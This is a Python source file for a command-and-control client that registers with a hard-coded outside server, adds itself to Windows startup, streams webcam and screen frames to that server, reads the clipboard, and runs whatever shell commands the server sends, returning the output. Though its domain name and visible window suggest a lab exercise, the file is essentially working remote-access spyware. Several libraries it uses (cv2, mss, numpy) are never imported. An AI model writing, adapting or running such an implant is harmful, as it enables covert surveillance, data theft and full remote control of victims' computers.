#!/usr/bin/env python3
"""
🎯 CLOUD C2 CLIENT
✅ Connects to Pxxl URL
✅ Auto-starts on boot
✅ Keeps window visible
"""
import requests, subprocess, platform, time, uuid, os
import threading
import pyperclip
import base64

# ============================================================
# YOUR PXXL URL
# ============================================================
C2_URL = "https://c2lab1.pxxlspace.cv"
CLIENT_ID = str(uuid.uuid4())[:8]

# ============================================================
# AUTO-START ON BOOT
# ============================================================
def add_to_startup():
    if platform.system() == 'Windows':
        script_path = os.path.abspath(__file__)
        startup_folder = os.path.expanduser(r'~\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
        bat_path = os.path.join(startup_folder, 'local_c2_start.bat')
        
        with open(bat_path, 'w') as f:
            f.write(f'@echo off\n')
            f.write(f'title Cloud C2 Client - {platform.node()}\n')
            f.write(f'python "{script_path}"\n')
        
        print(f"[+] Auto-start installed.")

# ============================================================
# COMMUNICATION
# ============================================================
def register():
    try:
        requests.post(f"{C2_URL}/register", json={
            'client_id': CLIENT_ID, 'hostname': platform.node(), 'os': platform.system()
        }, timeout=5)
    except: pass

def get_command():
    try:
        r = requests.get(f"{C2_URL}/get_command/{CLIENT_ID}", timeout=5)
        if r.status_code == 200: return r.json().get('command')
    except: pass
    return None

def send_result(cmd, out):
    try: 
        requests.post(f"{C2_URL}/send_result", json={'client_id': CLIENT_ID, 'command': cmd, 'output': out}, timeout=5)
    except: pass

# ============================================================
# CAMERA & SCREEN THREADS
# ============================================================
def camera_worker():
    cap = cv2.VideoCapture(0)
    while True:
        ret, frame = cap.read()
        if ret:
            frame = cv2.resize(frame, (320, 240))
            _, buffer = cv2.imencode('.jpg', frame)
            b64 = base64.b64encode(buffer).decode()
            try: 
                requests.post(f"{C2_URL}/stream_frame/{CLIENT_ID}/camera", json={'image': b64}, timeout=2)
            except: pass
        time.sleep(0.5)

def screen_worker():
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        while True:
            try:
                img = np.array(sct.grab(monitor))
                frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                frame = cv2.resize(frame, (640, 360))
                _, buffer = cv2.imencode('.jpg', frame)
                b64 = base64.b64encode(buffer).decode()
                requests.post(f"{C2_URL}/stream_frame/{CLIENT_ID}/screen", json={'image': b64}, timeout=2)
            except: pass
            time.sleep(1)

# ============================================================
# COMMAND PROCESSOR
# ============================================================
def execute_command(cmd):
    try:
        if cmd == 'clipboard':
            return "[+] Clipboard Content:\n" + pyperclip.paste()
        
        elif cmd.startswith('tts:'):
            text = cmd[4:]
            if platform.system() == 'Windows':
                ps = f'PowerShell -Command "Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(\'{text}\')"'
                subprocess.Popen(ps, shell=True)
                return "[+] Spoken via TTS"
            return "[-] TTS only works on Windows"
            
        else:
            r = subprocess.run(cmd, shell=True, capture_output=True, timeout=10, text=True)
            out = r.stdout if r.stdout else r.stderr
            return out if out else "[+] Executed"

    except Exception as e:
        return f"[-] Error: {e}"

# ============================================================
# MAIN
# ============================================================
if __name__ == '__main__':
    add_to_startup()
    
    if platform.system() == 'Windows':
        os.system(f'title CLOUD C2 CLIENT - {CLIENT_ID} - DO NOT CLOSE')
    
    print(f"""
╔═══════════════════════════════════════════════════════════════════╗
║   🎯 CLOUD C2 CLIENT RUNNING                                      ║
║                                                                   ║
║   ID: {CLIENT_ID}                                                       ║
║   Server: {C2_URL}                            ║
║                                                                   ║
║   Window is visible. It will auto-start when you reboot.          ║
║   Press Ctrl+C to stop.                                           ║
╚═══════════════════════════════════════════════════════════════════╝
    """)
    
    threading.Thread(target=camera_worker, daemon=True).start()
    threading.Thread(target=screen_worker, daemon=True).start()
    
    register()
    print("[+] Registered with server. Waiting for commands...")
    
    while True:
        try:
            cmd = get_command()
            if cmd:
                print(f"[*] Executing: {cmd}")
                out = execute_command(cmd)
                send_result(cmd, out)
            time.sleep(2)
        except KeyboardInterrupt:
            print("\n[!] Stopped.")
            break
